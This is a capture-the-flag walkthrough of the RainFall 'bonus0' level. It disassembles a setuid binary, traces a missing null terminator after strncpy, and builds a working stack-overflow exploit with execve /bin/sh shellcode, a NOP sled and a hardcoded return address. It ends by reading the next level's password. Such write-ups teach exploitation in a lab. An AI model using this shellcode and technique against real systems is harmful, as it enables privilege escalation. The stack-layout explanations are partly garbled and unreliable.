# Bonus0
## Initial Analysis
### 1. Examine the Binary
```bash
bonus0@RainFall:~$ ls -la
total 8
-rwsr-s---+ 1 bonus1 users 5720 Mar  6  2016 bonus0
bonus0@RainFall:~$ file bonus0
bonus0: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x5c4c6c4f1b0e9b7c8d9a4f3e2d1c0b9a8f7e6d5c, not stripped
```
**Key observations:**

- setuid and setgid binary (s flags in permissions)

- Owned by bonus1 user

- When executed, runs with bonus1 privileges

### 2. Test Basic Execution
```bash
bonus0@RainFall:~$ ./bonus0
 -
hello
 -
world
hello world
bonus0@RainFall:~$ ./bonus0
 -
test
 -
input
test input
```
**Observations:**

- Program asks for two inputs (each preceded by " -")

- Prints both inputs separated by a space

- Inputs are processed and combined in some way

## Reverse Engineering
### 3. Function Analysis
```bash
bonus0@RainFall:~$ gdb bonus0
(gdb) info functions
All defined functions:
0x08048380  read@plt
0x08048390  strcat@plt
0x080483a0  strcpy@plt
0x080483b0  puts@plt
0x080483d0  strchr@plt
0x080483f0  strncpy@plt
0x080484b4  p
0x0804851e  pp
0x080485a4  main
```
**Function Hierarchy:**

```text
main()
  └─ pp()
      ├─ p() - called twice
      ├─ strcpy()
      └─ strcat()
```

### 4. Disassembling main
```bash
(gdb) disas main
assembly
0x080485a4 <+0>:     push   %ebp
0x080485a5 <+1>:     mov    %esp,%ebp
0x080485a7 <+3>:     and    $0xfffffff0,%esp
0x080485aa <+6>:     sub    $0x40,%esp          # 64 bytes local buffer
0x080485ad <+9>:     lea    0x16(%esp),%eax     # buffer at esp+22
0x080485b1 <+13>:    mov    %eax,(%esp)         # pass to pp()
0x080485b4 <+16>:    call   0x804851e <pp>
0x080485b9 <+21>:    lea    0x16(%esp),%eax     # same buffer
0x080485bd <+25>:    mov    %eax,(%esp)
0x080485c0 <+28>:    call   0x80483b0 <puts@plt> # print result
0x080485c5 <+33>:    mov    $0x0,%eax
0x080485ca <+38>:    leave
0x080485cb <+39>:    ret
main() creates a 64-byte buffer at esp+22 and passes it to pp()
```

### 5. Disassembling pp
```bash
(gdb) disas pp
assembly
0x0804851e <+0>:     push   %ebp
0x0804851f <+1>:     mov    %esp,%ebp
0x08048521 <+3>:     push   %edi
0x08048522 <+4>:     push   %ebx
0x08048523 <+5>:     sub    $0x50,%esp
0x08048526 <+8>:     movl   $0x80486a0,0x4(%esp)  # " -" prompt
0x0804852e <+16>:    lea    -0x30(%ebp),%eax      # buffer1 (48 bytes offset)
0x08048531 <+19>:    mov    %eax,(%esp)
0x08048534 <+22>:    call   0x80484b4 <p>         # first call to p()
0x08048539 <+27>:    movl   $0x80486a0,0x4(%esp)  # " -" prompt
0x08048541 <+35>:    lea    -0x1c(%ebp),%eax      # buffer2 (28 bytes offset)
0x08048544 <+38>:    mov    %eax,(%esp)
0x08048547 <+41>:    call   0x80484b4 <p>         # second call to p()
0x0804854c <+46>:    lea    -0x30(%ebp),%eax      # buffer1
0x0804854f <+49>:    mov    %eax,0x4(%esp)        # source
0x08048553 <+53>:    mov    0x8(%ebp),%eax        # main's buffer
0x08048556 <+56>:    mov    %eax,(%esp)           # destination
0x08048559 <+59>:    call   0x80483a0 <strcpy@plt> # copy buffer1 to main
0x0804855e <+64>:    mov    $0x80486a4,%ebx       # space character " "
0x08048563 <+69>:    mov    0x8(%ebp),%eax        # main's buffer
0x08048566 <+72>:    movl   $0xffffffff,-0x3c(%ebp)
0x0804856d <+79>:    mov    %eax,%edx
0x0804856f <+81>:    mov    $0x0,%eax
0x08048574 <+86>:    mov    -0x3c(%ebp),%ecx
0x08048577 <+89>:    mov    %edx,%edi
0x08048579 <+91>:    repnz scas %es:(%edi),%al    # find end of string
0x0804857b <+93>:    mov    %ecx,%eax
0x0804857d <+95>:    not    %eax
0x0804857f <+97>:    sub    $0x1,%eax
0x08048582 <+100>:   add    0x8(%ebp),%eax        # pointer to end
0x08048585 <+103>:   movzwl (%ebx),%edx           # space character
0x08048588 <+106>:   mov    %dx,(%eax)            # append space
0x0804858b <+109>:   lea    -0x1c(%ebp),%eax      # buffer2
0x0804858e <+112>:   mov    %eax,0x4(%esp)        # source
0x08048592 <+116>:   mov    0x8(%ebp),%eax        # main's buffer
0x08048595 <+119>:   mov    %eax,(%esp)           # destination
0x08048598 <+122>:   call   0x8048390 <strcat@plt> # append buffer2
0x0804859d <+127>:   add    $0x50,%esp
0x080485a0 <+130>:   pop    %ebx
0x080485a1 <+131>:   pop    %edi
0x080485a2 <+132>:   pop    %ebp
0x080485a3 <+133>:   ret
pp() logic:
```

- Calls p() twice to fill buffer1 (ebp-0x30) and buffer2 (ebp-0x1c)

- strcpy() copies buffer1 to main's buffer

- Appends a space character

- strcat() appends buffer2 to main's buffer

### 6. Disassembling p - The Vulnerability
```bash
(gdb) disas p
assembly
0x080484b4 <+0>:     push   %ebp
0x080484b5 <+1>:     mov    %esp,%ebp
0x080484b7 <+3>:     sub    $0x1018,%esp          # 4120 bytes stack allocation
0x080484bd <+9>:     mov    0xc(%ebp),%eax        # prompt string
0x080484c0 <+12>:    mov    %eax,(%esp)
0x080484c3 <+15>:    call   0x80483b0 <puts@plt>  # print prompt
0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)     # 4096 bytes to read
0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax    # local buffer (4096 bytes)
0x080484d6 <+34>:    mov    %eax,0x4(%esp)        # buffer
0x080484da <+38>:    movl   $0x0,(%esp)           # stdin
0x080484e1 <+45>:    call   0x8048380 <read@plt>  # read(0, buffer, 4096)
0x080484e6 <+50>:    movl   $0xa,0x4(%esp)        # newline character
0x080484ee <+58>:    lea    -0x1008(%ebp),%eax    # buffer
0x080484f4 <+64>:    mov    %eax,(%esp)
0x080484f7 <+67>:    call   0x80483d0 <strchr@plt> # find newline
0x080484fc <+72>:    movb   $0x0,(%eax)            # replace with null
0x080484ff <+75>:    lea    -0x1008(%ebp),%eax    # buffer
0x08048505 <+81>:    movl   $0x14,0x8(%esp)       # 20 bytes to copy
0x0804850d <+89>:    mov    %eax,0x4(%esp)        # source
0x08048511 <+93>:    mov    0x8(%ebp),%eax        # destination (buffer1/2)
0x08048514 <+96>:    mov    %eax,(%esp)
0x08048517 <+99>:    call   0x80483f0 <strncpy@plt> # COPY 20 BYTES! ⚡
0x0804851c <+104>:   leave
0x0804851d <+105>:   ret
```
## Critical Vulnerability Discovered:

- Function	What it does	Issue
- read()	Reads up to 4096 bytes into local buffer	Safe
- strchr()	Finds newline, replaces with null	Good
- strncpy()	Copies first 20 bytes to destination	MAY NOT NULL TERMINATE! ⚡

## The strncpy() Problem:
**From the man page:**

- "If the source string has a size greater than that specified in parameter, then the produced string will not be terminated by null ASCII code (character '\0')."

- If our input is exactly 20 bytes or longer, the destination buffer will have NO NULL TERMINATOR!

## The Vulnerability Chain

### 7. Understanding the Exploit

- Normal case (safe):

```text
First input: "hello" (5 bytes + newline)
strncpy copies 5 bytes + null terminator
buffer1: "hello\0"

Second input: "world" (5 bytes + newline)  
strncpy copies 5 bytes + null terminator
buffer2: "world\0"

strcpy(buffer1) → stops at null → "hello"
strcat(buffer2) → appends "world" → "hello world"
Vulnerable case (unsafe):
```
```text
First input: "AAAAAAAAAAAAAAAAAAAA" (20 bytes EXACTLY, no null!)
strncpy copies 20 bytes, NO NULL TERMINATOR
buffer1: "AAAAAAAAAAAAAAAAAAAA" (no null!)

Second input: "BBBBBBBBBBBBBBBBBBBB" (20 bytes EXACTLY)
strncpy copies 20 bytes, NO NULL TERMINATOR  
buffer2: "BBBBBBBBBBBBBBBBBBBB" (no null!)

strcpy(buffer1) → KEEPS READING past buffer1 into buffer2, saved ebp, return address!
8. Memory Layout in pp()
text
Stack frame of pp():

Higher addresses
┌──────────────────────────┐
│                          │
│     buffer2 (20 bytes)   │ ← ebp-0x1c (no null terminator)
│                          │
├──────────────────────────┤
│                          │
│     buffer1 (20 bytes)   │ ← ebp-0x30 (no null terminator)
│                          │
├──────────────────────────┤
│                          │
│     saved ebp            │ ← 4 bytes
│                          │
├──────────────────────────┤
│                          │
│     return address       │ ← 4 bytes (OUR TARGET!)
│                          │
└──────────────────────────┘
Lower addresses
```

### 9. The strcpy() Disaster
When strcpy(dest, buffer1) is called:

```text
Step 1: Copy buffer1 (20 bytes, no null) → still no null
Step 2: Keep reading next memory → buffer2 (20 bytes, no null)
Step 3: Keep reading → saved ebp (4 bytes)
Step 4: Keep reading → return address (4 bytes)
Step 5: Keep reading → ??? until eventually finding a null
This means the string copied to main's buffer contains:
[buffer1][buffer2][saved ebp][return address][...]
```
### 10. Finding the Offset
**Using a De Bruijn pattern to find exactly where the return address lands:**

```bash
(gdb) run
First input: "01234567890123456789" (20 bytes)
Second input: "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A..."

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```
## Pattern Analysis:

- 0x41336141 = "Aa3A" in ASCII

- This appears at position 9 in the second input

- Offset = 9 bytes from start of second input to return address

## Exploitation Strategy
### 11. The Attack Plan
**We need to:**

- First input: Place shellcode in p()'s large buffer (4096 bytes)

- Second input: Overwrite return address to point to our shellcode

```text
Stack layout during p() execution:

p() stack frame:
┌──────────────────────────┐
│                          │
│   local buffer (4096)    │ ← ebp-0x1008 (OUR SHELLCODE HERE!)
│                          │
├──────────────────────────┤
│                          │
│   saved ebp              │
├──────────────────────────┤
│                          │
│   return address         │ ← Will point to our shellcode
│                          │
└──────────────────────────┘
```
### 12. Finding the Buffer Address

```bash
(gdb) disas p
...
0x080484d0 <+28>:    lea    eax,[ebp-0x1008]    # buffer start
...
(gdb) b *p+28
Breakpoint 1 at 0x80484d0
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -

Breakpoint 1, 0x080484d0 in p ()
(gdb) x $ebp-0x1008
0xbfffe680:     0x00000000
Buffer address: 0xbfffe680
```

### 13. Return Address Calculation
- The return address needs to point somewhere in our NOP sled:

- Buffer start: 0xbfffe680

- After 61 bytes of concatenation: 0xbfffe680 + 61 = 0xbfffe6bd

- We'll place 100 NOPs: range 0xbfffe680 to 0xbfffe6e4

- Choose address: 0xbfffe6d0 (safe within NOP sled)

### 14. Crafting the Payloads
- First input (4096-byte buffer in p()):

```text
[100 NOPs (\x90)] + [28-byte shellcode] + [rest NOPs]
Shellcode (28 bytes, execve /bin/sh):

assembly
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
Second input (controls return address):
```
```text
[9 bytes 'A'] + [4 bytes return address] + [7 bytes 'B']
```
### 15. Final Exploit
```bash
(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
```
- Execution:

```bash
bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
 - 
 - 
AAAAAAAAABBBBBBB AAAAAAAAABBBBBBB
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
